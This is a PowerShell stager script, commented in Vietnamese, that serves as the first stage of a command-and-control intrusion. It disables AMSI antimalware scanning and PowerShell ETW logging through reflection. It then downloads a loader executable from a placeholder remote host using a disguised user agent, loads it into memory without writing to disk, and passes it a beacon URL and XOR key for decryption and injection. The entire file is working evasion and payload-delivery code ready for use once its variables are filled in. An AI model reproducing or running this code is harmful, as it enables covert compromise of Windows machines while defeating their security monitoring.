# stager.ps1
# Dieu chinh 3 bien sau truoc khi dung:
$loaderUrl  = "http://CLOUDFLARE_URL/updates/loader.exe"   # URL chua loader.exe tren VM2
$beaconUrl  = "http://CLOUDFLARE_URL/updates/beacon.bin"   # URL chua beacon XOR-encrypted
$xorKey     = "YOURXORKEY"                                  # Key XOR de decrypt beacon

# =============================================
# BUOC 1: AMSI BYPASS cho PowerShell process
# Dung reflection de set amsiInitFailed = true
# PS AMSI khac voi C# AMSI — phai bypass rieng
# =============================================
try {
    $r = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $r.GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
} catch {}

# Lan 2 de chac chan (mot so version Win11 can ca hai)
try {
    $r2 = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f2 = $r2.GetField('s_amsiContext','NonPublic,Static')
    $f2.SetValue($null,[IntPtr]::Zero)
} catch {}

# =============================================
# BUOC 2: Tat ETW cho PowerShell
# =============================================
try {
    $e = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
    $eb = $e.GetField('etwProvider','NonPublic,Static')
    $ep = $eb.GetValue($null)
    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($ep, 0)
} catch {}

# =============================================
# BUOC 3: Download loader.exe vao RAM (khong cham disk)
# Su dung WebClient voi UA khop redirector filter
# =============================================
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0')
    $wc.Headers.Add('X-Beacon-Key','infected')
    $bytes = $wc.DownloadData($loaderUrl)
} catch { exit }

# =============================================
# BUOC 4: Load assembly vao RAM va goi Main
# Loader.exe tu xu ly: download beacon, decrypt, inject
# =============================================
try {
    $asm  = [System.Reflection.Assembly]::Load($bytes)
    $type = $asm.GetType('FinalLoaderV5.Program')
    $main = $type.GetMethod('Main', [System.Reflection.BindingFlags]'Static,Public,NonPublic')
    $main.Invoke($null, @(,[string[]]@($beaconUrl, $xorKey)))
} catch {}
